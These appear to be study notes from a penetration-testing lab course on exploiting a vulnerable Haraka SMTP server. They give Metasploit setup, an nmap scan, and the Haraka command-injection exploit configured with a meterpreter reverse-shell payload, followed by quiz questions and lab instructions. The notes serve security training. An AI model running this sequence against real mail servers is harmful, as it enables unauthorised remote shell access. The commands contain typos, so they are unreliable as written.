- Simple Mail Transfer Protocol
- Uses Port 25, 456 or 587
- Haraka Node js SMTP server


Setup msfconsole
```
service postgresql start 
msfconsole
workspace -a haraka
setg RHOST <target_ip>
setg RHOSTS <target_ip>
setg LHOST <local_ip>
```

Scan and Enumerate target ip 
```
db_nmap -sS -sV -O <target_ip>
```

Setup haraka exploit
```
search type:exploit haraka
use exmploit/linux/smtp/haraka
options
set SRVPORT 9898
set email_to root@attackdefense.test
info
set payload linux/x64/metepreter_reverse_http
options
exploit
```
## Quiz 

Which one of the following MSFconsole search queries can be used to search for Haraka SMTP exploit modules?

	search type:exploit name:haraka
	
Haraka SMTP versions prior to V2.8.9 are vulnerable to command injection.

	TRUE
## Lab

The target server as described below is running a vulnerable SMTP service. Your task is to fingerprint the application using command line tools available on the Kali terminal and then exploit the application using the appropriate Metasploit module. Get a shell on the target!

Instructions:Â 

- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a root terminal of a Kali instance
- Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
- The target server should be located at the IP address 192.X.Y.3.
- Do not attack the gateway located at IP address 192.X.Y.1
- postgresql is not running by default so Metasploit may give you an error about this when starting

```
192.41.20.2
192.41.20.3
```

